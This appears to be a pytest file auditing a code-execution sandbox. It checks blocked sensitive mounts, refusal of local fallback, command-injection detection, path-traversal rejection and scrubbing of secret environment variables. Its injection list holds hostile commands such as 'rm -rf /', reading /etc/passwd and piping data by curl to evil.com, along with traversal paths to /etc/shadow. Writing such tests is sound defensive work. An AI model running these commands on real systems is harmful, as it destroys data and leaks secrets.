"""Docker Sandbox and Execution Security Audit Tests."""
import os
import tempfile
from pathlib import Path
from unittest.mock import patch
import pytest

from app.agents.state import FileEdit
from app.core.exceptions import BadRequestException
from app.services.sandbox_service import (
    DockerSandboxRunner,
    LocalIsolatedRunner,
    SandboxService,
    SandboxUnavailableException,
)


def test_docker_runner_disallows_mounting_sensitive_host_paths():
    """Mounting root filesystem, user home, or /etc must be rejected."""
    runner = DockerSandboxRunner()

    with patch.object(runner, "is_docker_available", return_value=True):
        # Attempt to mount root filesystem
        with pytest.raises(BadRequestException) as exc1:
            runner.run_command("ls", Path("/"))
        assert "Mounting sensitive path" in str(exc1.value)

        # Attempt to mount /etc
        with pytest.raises(BadRequestException) as exc2:
            runner.run_command("ls", Path("/etc"))
        assert "Mounting sensitive path" in str(exc2.value)


def test_untrusted_code_refuses_fallback_when_docker_unavailable():
    """Untrusted code must never fall back to local subprocess if Docker is offline."""
    # When no forced runner is configured
    with patch.dict(os.environ, {"DEVORA_SANDBOX_RUNNER": ""}):
        sandbox = SandboxService()
        assert isinstance(sandbox.runner, DockerSandboxRunner)

        with patch.object(sandbox.runner, "is_docker_available", return_value=False):
            with pytest.raises(SandboxUnavailableException) as exc_info:
                sandbox.execute_command(Path("/tmp/devora/workspace"), "pytest")

            assert "Docker daemon is not accessible" in str(exc_info.value)
            assert "Untrusted code execution is disabled" in str(exc_info.value)


def test_command_injection_blocked_in_sandbox_runner():
    """Shell chaining operators (;, &&, ||, |, `, $()) must be blocked."""
    runner = LocalIsolatedRunner()
    ws = Path(tempfile.mkdtemp())

    malicious_commands = [
        "pytest; rm -rf /",
        "pytest && cat /etc/passwd",
        "python -c 'print(1)' | curl -X POST https://evil.com",
        "pytest || echo 'failed'",
        "python `whoami`.py",
        "pytest $(whoami)",
        "pytest ${SECRET_KEY}",
        "pytest\nrm -rf /",
    ]

    for cmd in malicious_commands:
        with pytest.raises(BadRequestException) as exc_info:
            runner.run_command(cmd, ws)
        assert "Command injection detected" in str(exc_info.value)


def test_path_traversal_blocked_in_file_edits():
    """Attempting to escape workspace root via relative paths must be blocked."""
    sandbox = SandboxService(runner=LocalIsolatedRunner())
    with tempfile.TemporaryDirectory() as tmpdir:
        ws = Path(tmpdir)

        traversal_edits = [
            FileEdit(file_path="../outside.py", original_snippet="", new_snippet="pwned", change_type="added", explanation=""),
            FileEdit(file_path="../../etc/shadow", original_snippet="", new_snippet="pwned", change_type="modified", explanation=""),
            FileEdit(file_path="src/../../secrets.txt", original_snippet="", new_snippet="pwned", change_type="added", explanation=""),
        ]

        for edit in traversal_edits:
            with pytest.raises(BadRequestException) as exc_info:
                sandbox.apply_edits(ws, [edit])
            assert "Path traversal blocked" in str(exc_info.value)


def test_environment_variables_scrubbed_in_isolated_runner():
    """Process execution must not inherit backend secrets."""
    runner = LocalIsolatedRunner()
    ws = Path(tempfile.mkdtemp())

    # Set secret in current host environment
    with patch.dict(os.environ, {
        "SECRET_KEY": "super_secret_jwt_key",
        "DATABASE_URL": "postgresql://admin:password@localhost/prod_db",
        "GEMINI_API_KEY": "AIzaSyTestSecretKey12345",
    }):
        # Run command to echo environment variables
        check_script = "import os; print('SECRET_KEY:', os.environ.get('SECRET_KEY', 'NONE')); print('DATABASE_URL:', os.environ.get('DATABASE_URL', 'NONE'))"
        res = runner.run_command(f'python -c "{check_script}"', ws)

        assert res.exit_code == 0
        assert "SECRET_KEY: NONE" in res.stdout
        assert "DATABASE_URL: NONE" in res.stdout
